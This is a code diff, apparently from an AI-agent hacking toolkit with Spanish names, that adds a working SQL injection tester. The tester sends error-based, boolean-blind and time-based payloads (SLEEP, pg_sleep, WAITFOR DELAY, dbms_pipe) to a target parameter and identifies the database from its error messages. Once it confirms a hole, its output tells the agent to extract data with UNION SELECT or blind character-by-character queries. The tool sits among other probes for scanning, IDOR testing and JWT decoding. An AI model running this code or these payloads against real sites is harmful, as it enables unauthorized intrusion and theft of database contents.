@@ -331,7 +331,7 @@ def probar_idor(url, desde=None, hasta=None):
 
 NOMBRES = ('huella_web', 'peticion_http', 'enumerar_rutas', 'analizar_js',
            'decodificar_jwt', 'probar_idor', 'escanear_puertos', 'ver_certificado',
-           'dns_registros')
+           'dns_registros', 'probar_sqli')
 
 def herramienta(nombre, args):
     a = args if isinstance(args, dict) else {}
@@ -355,6 +355,8 @@ def herramienta(nombre, args):
             return ver_certificado(a.get('host') or a.get('url'))
         if nombre == 'dns_registros':
             return dns_registros(a.get('dominio') or a.get('url'))
+        if nombre == 'probar_sqli':
+            return probar_sqli(a.get('url'), a.get('parametro'), a.get('metodo'), a.get('cuerpo'))
     except Exception as e:
         print('[HACK]', e)
         return {'ok': False, 'error': 'fallo la herramienta: ' + str(e)[:150]}
@@ -389,4 +391,98 @@ HERRAMIENTAS = [
        {'host': {'type': 'string'}}, ('host',)),
     _e('dns_registros', 'Registros DNS publicos (A, MX, TXT, NS). Los TXT delatan servicios.',
        {'dominio': {'type': 'string'}}, ('dominio',)),
+    _e('probar_sqli', 'Prueba inyeccion SQL en un parametro: por error, ciega booleana y por tiempo. '
+       'Confirma o descarta, no adivina.', {'url': {'type': 'string'}, 'parametro': {'type': 'string'},
+       'metodo': {'type': 'string'}, 'cuerpo': {'type': 'string'}}, ('url', 'parametro')),
 ]
+
+ERRORES_SQL = {
+    'MySQL': ('you have an error in your sql syntax', 'warning: mysql', 'mysqli_'),
+    'MSSQL': ('unclosed quotation mark', 'microsoft ole db', 'sql server native', 'odbc sql server'),
+    'Oracle': ('ora-0', 'oracle error'),
+    'PostgreSQL': ('pg_query', 'postgresql', 'unterminated quoted string'),
+    'SQLite': ('sqlite_', 'sql logic error'),
+}
+TIEMPO_SQL = (('MySQL', "' AND SLEEP(4)-- -"), ('PostgreSQL', "' AND pg_sleep(4)-- -"),
+              ('MSSQL', "'; WAITFOR DELAY '0:0:4'-- -"),
+              ('Oracle', "' AND 1=dbms_pipe.receive_message('a',4)-- -"))
+PARES_SQL = (("' AND '1'='1", "' AND '1'='2"), ("' AND 1=1-- -", "' AND 1=2-- -"),
+             ('" AND 1=1-- -', '" AND 1=2-- -'), ("1 AND 1=1", "1 AND 1=2"),
+             ("') AND 1=1-- -", "') AND 1=2-- -"), ("' OR '1'='1", "' OR '1'='2"))
+
+def _pon(url, param, valor):
+    u = re.sub(r'([?&])' + re.escape(param) + r'=[^&]*', lambda m: m.group(1) + param + '=' + valor, url, count=1)
+    if param + '=' not in u:
+        u += ('&' if '?' in u else '?') + param + '=' + valor
+    return u
+
+def _pon_cuerpo(cuerpo, param, valor):
+    c = re.sub(r'(^|&)' + re.escape(param) + r'=[^&]*', lambda m: m.group(1) + param + '=' + valor, cuerpo or '')
+    return c if param + '=' in c else (cuerpo or '') + '&' + param + '=' + valor
+
+def _huella(r):
+    return (r.status_code, len(r.content or b''), hashlib.md5((r.text or '')[:4000].encode()).hexdigest()[:8])
+
+def probar_sqli(url, parametro, metodo='GET', cuerpo=None):
+    u = _norm(url)
+    if not u or not parametro:
+        return {'ok': False, 'error': 'hacen falta url y parametro'}
+    m = 'POST' if str(metodo).upper() == 'POST' else 'GET'
+
+    def pedir(valor):
+        if m == 'POST':
+            return _pedir(u, 'POST', {'Content-Type': 'application/x-www-form-urlencoded'},
+                          _pon_cuerpo(cuerpo, parametro, valor))
+        return _pedir(_pon(u, parametro, valor))
+
+    base, err = pedir('1')
+    if err:
+        return err
+    hb = _huella(base)
+    res = {'ok': True, 'url': u, 'parametro': parametro, 'metodo': m,
+           'error_bd': '', 'boolean': [], 'tiempo': '', 'dbms': '', 'vulnerable': False}
+
+    for firma in ("'", '"', "')", "\\"):
+        r, e = pedir(firma)
+        if e or r is None:
+            continue
+        bajo = (r.text or '')[:8000].lower()
+        for bd, patrones in ERRORES_SQL.items():
+            if any(p in bajo for p in patrones):
+                res['error_bd'] = bd
+                res['dbms'] = bd
+                res['vulnerable'] = True
+                res['detalle'] = 'error de sintaxis SQL con el payload ' + firma
+                break
+        if res['error_bd']:
+            break
+
+    for verdadero, falso in PARES_SQL:
+        rt, e1 = pedir(verdadero)
+        rf, e2 = pedir(falso)
+        if e1 or e2 or rt is None or rf is None:
+            continue
+        ht, hf = _huella(rt), _huella(rf)
+        if ht[0] == hf[0] and abs(ht[1] - hf[1]) > 40:
+            res['boolean'].append({'par': [verdadero, falso], 'largos': [ht[1], hf[1]]})
+            res['vulnerable'] = True
+
+    for bd, carga in TIEMPO_SQL:
+        t0 = time.time()
+        r, e = pedir(carga)
+        seg = time.time() - t0
+        if e or r is None:
+            continue
+        if seg >= 3.5:
+            res['tiempo'] = f'{bd}: {seg:.1f}s con {carga}'
+            res['dbms'] = res['dbms'] or bd
+            res['vulnerable'] = True
+            break
+
+    if not res['vulnerable']:
+        res['detalle'] = 'no se confirmo inyeccion en ese parametro'
+    else:
+        res['detalle'] = res.get('detalle') or 'diferencia consistente entre condicion verdadera y falsa'
+    res['nota'] = ('Confirmado: usa peticion_http para extraer datos (UNION SELECT o boolean a ciegas). '
+                   'Si solo hay tiempo, es ciego y hay que extraer letra por letra.')
+    return res
